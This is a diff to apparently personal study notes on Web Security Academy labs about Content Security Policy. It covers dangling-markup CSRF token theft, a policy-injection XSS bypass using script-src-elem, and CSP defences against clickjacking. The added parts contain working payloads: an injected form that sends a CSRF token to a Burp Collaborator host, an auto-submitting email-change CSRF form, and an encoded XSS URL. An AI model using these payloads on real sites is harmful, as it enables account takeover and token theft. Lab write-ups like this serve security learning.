@@ -70,7 +70,7 @@ So this is what we have in the beginning:
 Then on exploit server we'll have the following script (i.e. we close existing form and open a new one. New form is going to contain csrf input):
 ```bash
 <script>
-     window.location = 'https://0a00006004189203812fe924009d0012.web-security-academy.net/my-account?id=wiener&email=any"></form><form name="myForm" action="https://bhwfm3nmwftm5ddwansb9cw21t7kvfj4.oastify.com" method="GET"><button class="button" type="submit">Click</button'
+     window.location = 'https://0a2f00400490e2b598fea0a000260019.web-security-academy.net/my-account?email=any"></form><form name="myForm" action="https://od5uidti3zskabyg72f25lcrpiv9jz7o.oastify.com" method="GET"><button class="button" type="submit">Click</button'
 </script>
 ```
 
@@ -80,11 +80,95 @@ That script above will change the page, so that now it includes 2 forms and 2 bu
     <label>Email</label>
     <input required type="email" name="email" value="">
 </form>
-<form name="myForm" action="https://exploit-0a7200750403ef5780cb07c501b500f3.exploit-server.net/exploit" method="GET"><button type="submit" class="button">Click</button">
+<form name="myForm" action="https://od5uidti3zskabyg72f25lcrpiv9jz7o.oastify.com" method="GET"><button type="submit" class="button">Click</button">
     <input required type="hidden" name="csrf" value="oEKUbXmXgNrmUZMcaY4uw8vAA3uKZRSt">
     <button class='button' type='submit'> Update email </button>
 </form>
 ```
-When user clicks on "Click" button - csrf token is sent to the exploit server
+When user clicks on "Click" button - csrf token is sent to the burp collab server
 Later we construct another attack to change the user's email with the csrf token that we got
+Here's csrf:
+```bash
+<form action="https://0a2f00400490e2b598fea0a000260019.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="hacker@evil-user.net" />
+  <input type="hidden" name="csrf" value="Ip2utiucfdIVGJoO1rUm14DVnEvVOvJy" />
+  <input type="submit" value="Submit request" />
+</form>
+<script>
+  history.pushState('', '', '/');
+  document.forms[0].submit();
+</script>
+```
+
+## Mitigating dangling markup attacks using CSP
+The following directive will only allow images to be loaded from the same origin as the page itself:
+```
+img-src 'self'
+```
+The following directive will only allow images to be loaded from a specific domain:
+```
+img-src https://images.normal-website.com
+```
+Note that these policies will prevent some dangling markup exploits, because an easy way to capture data with no user interaction is using an img tag. However, it will not prevent other exploits, such as those that inject an anchor tag with a dangling href attribute.
+
+## Bypassing CSP with policy injection
+### Lab: Reflected XSS protected by CSP, with CSP bypass
+There's an input for the website's search. 
+Whatever we type into the input is reflected into the DOM (i.e. we've got reflected XSS there).
+
+However when we try to inject into the search input
+```bash
+<img src=1 onerror=alert(1)>
+```
+we see that the payload is reflected, but the CSP prevents the inline script from executing
+
+So there's an endpoint:
+```
+https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=vv
+```
+In the response there's:
+```
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+```
+We're interested in `report-uri /csp-report?token=`
+
+You may encounter a website that reflects input into the actual policy, most likely in a report-uri directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this report-uri directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.
+
+It turns out that if we modify the endpoint above, i.e. add additional query parameter with the name `token` then the value of it will be reflected in the response CSP header
+Req:
+```
+https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=vv&token=ff
+```
+Res:
+```
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=ff
+```
+
+Normally, it's not possible to overwrite an existing script-src directive. However, Chrome recently introduced the `script-src-elem` directive, which allows you to control script elements, but not events. Crucially, this new directive allows you to overwrite existing script-src directives
+
+Therefore to execute inline script we do the following:
+```
+https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+```
+We actually need to url encode it:
+```
+https://0a1200820303ea24811061a4003f001c.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+```
+
+## Protecting against clickjacking using CSP
+The following directive will only allow the page to be framed by other pages from the same origin:
+```bash
+frame-ancestors 'self'
+```
+The following directive will prevent framing altogether:
+```bash
+frame-ancestors 'none'
+```
+Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. For example:
+```bash
+frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
+```
+CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame.
+
+Using CSP to protect against clickjacking attacks is recommended. You can also combine this with the X-Frame-Options header to provide protection on older browsers that don't support CSP, such as Internet Explorer.
 
